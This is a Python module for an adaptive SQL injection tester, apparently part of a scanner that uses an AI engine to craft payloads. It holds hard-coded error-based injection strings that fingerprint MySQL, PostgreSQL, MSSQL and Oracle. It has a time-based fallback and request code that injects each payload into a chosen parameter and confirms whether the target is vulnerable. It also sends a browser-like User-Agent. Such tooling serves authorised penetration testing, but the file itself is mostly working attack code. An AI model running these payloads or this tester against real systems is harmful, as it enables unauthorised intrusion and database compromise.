"""
SQL Injection Testing Module - Fully Adaptive
"""

import requests
import logging
import time
from typing import Dict, Any, Optional
from urllib.parse import urlencode

from adaptive_engine import AdaptivePayloadEngine
from response_analyzer import ResponseAnalyzer
from payload_generator import PayloadGenerator

logger = logging.getLogger(__name__)

class SQLInjectionTester:
    """Adaptive SQL Injection tester with intelligent payload generation"""
    
    def __init__(self, ai_engine):
        self.ai_engine = ai_engine
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.max_attempts = 5
        self.used_payloads = []
        self.timeout = 10
        self.db_type = None
        self.vulnerable_parameters = {}
        
        # Initialize new components
        self.adaptive_engine = AdaptivePayloadEngine(ai_engine)
        self.response_analyzer = ResponseAnalyzer()
        self.payload_generator = PayloadGenerator()
    
    def test(self, vulnerability: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Test for SQL injection with adaptive payloads"""
        endpoint = vulnerability.get('endpoint')
        method = vulnerability.get('method', 'GET')
        parameter = vulnerability.get('parameter')
        
        logger.info(f"Testing SQL injection on {endpoint}, parameter: {parameter}")
        
        # Phase 1: Detect database type
        if not self.db_type:
            self.db_type = self._detect_database_type(endpoint, method, parameter)
            logger.info(f"Detected database type: {self.db_type}")
        
        # Phase 2: Adaptive testing with response-based payloads
        previous_response = None
        previous_payload = None
        
        for attempt in range(self.max_attempts):
            logger.info(f"  Attempt {attempt + 1}/{self.max_attempts}")
            
            # Generate adaptive payload based on previous response
            context = {
                'parameter': parameter,
                'url': endpoint,
                'method': method,
                'db_type': self.db_type,
                'attempt': attempt,
                'previous_response': previous_response,
                'previous_payload': previous_payload,
                'used_payloads': self.used_payloads
            }
            
            # Generate intelligent payload
            payload = self.adaptive_engine.generate_payload('SQL Injection', context)
            self.used_payloads.append(payload)
            
            logger.debug(f"  Testing payload: {payload}")
            
            # Send request
            response = self._send_request(endpoint, method, parameter, payload)
            
            if not response:
                continue
            
            # Analyze response
            analysis = self.response_analyzer.analyze_sql_response(response.text, payload)
            
            # Record response for learning
            self.adaptive_engine.record_response(response.text, payload, analysis['vulnerable'])
            
            if analysis['vulnerable']:
                logger.info(f"  ✓ SQL Injection confirmed!")
                logger.info(f"  Database: {analysis.get('db_type', 'Unknown')}")
                logger.info(f"  Error: {analysis.get('error_details', 'N/A')}")
                
                return {
                    'vulnerable': True,
                    'vulnerability': 'SQL Injection',
                    'endpoint': endpoint,
                    'method': method,
                    'parameter': parameter,
                    'payload': payload,
                    'evidence': analysis.get('error_details', 'SQL injection detected'),
                    'details': {
                        'db_type': analysis.get('db_type', self.db_type),
                        'technique': analysis.get('technique', 'error_based'),
                        'attempts': attempt + 1,
                        'status_code': response.status_code
                    }
                }
            
            # Update for next iteration
            previous_response = response.text
            previous_payload = payload
            
            # Check if we need to switch technique
            if attempt == 1 and not analysis.get('vulnerable'):
                logger.debug("  Switching to time-based technique...")
                # Generate time-based payloads
                time_payloads = self.payload_generator.generate_sqli_payloads(self.db_type, 'time_based')
                for tp in time_payloads[:2]:
                    logger.debug(f"  Testing time-based: {tp}")
                    time_response = self._send_request(endpoint, method, parameter, tp)
                    if time_response and time_response.elapsed.total_seconds() > 5:
                        return {
                            'vulnerable': True,
                            'vulnerability': 'SQL Injection',
                            'endpoint': endpoint,
                            'method': method,
                            'parameter': parameter,
                            'payload': tp,
                            'evidence': f'Time-based injection detected ({time_response.elapsed.total_seconds()}s delay)',
                            'details': {'technique': 'time_based', 'delay': time_response.elapsed.total_seconds()}
                        }
            
            time.sleep(0.5)
        
        logger.info(f"  ✗ No SQL injection found")
        return None
    
    def _detect_database_type(self, endpoint: str, method: str, param: str) -> str:
        """Detect database type using error-based payloads"""
        
        detection_payloads = {
            "MySQL": "' AND extractvalue(1,concat(0x7e,version()))--",
            "PostgreSQL": "' AND 1=CAST((SELECT version()) AS int)--",
            "MSSQL": "' AND 1=CONVERT(int, @@version)--",
            "Oracle": "' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))--"
        }
        
        for db_type, payload in detection_payloads.items():
            response = self._send_request(endpoint, method, param, payload)
            
            if response:
                analysis = self.response_analyzer.analyze_sql_response(response.text, payload)
                if analysis.get('db_type'):
                    return analysis['db_type']
        
        return 'Unknown'
    
    def _send_request(self, url: str, method: str, param: str, payload: str) -> Optional[requests.Response]:
        """Send HTTP request with payload"""
        try:
            if method.upper() == 'GET':
                if '?' in url:
                    base_url, query = url.split('?', 1)
                    params = {}
                    for p in query.split('&'):
                        if '=' in p:
                            key, val = p.split('=', 1)
                            params[key] = val
                    params[param] = payload
                    new_url = f"{base_url}?{urlencode(params)}"
                else:
                    new_url = f"{url}?{param}={payload}"
                
                return self.session.get(new_url, timeout=self.timeout)
            else:
                data = {param: payload}
                return self.session.post(url, data=data, timeout=self.timeout)
                
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None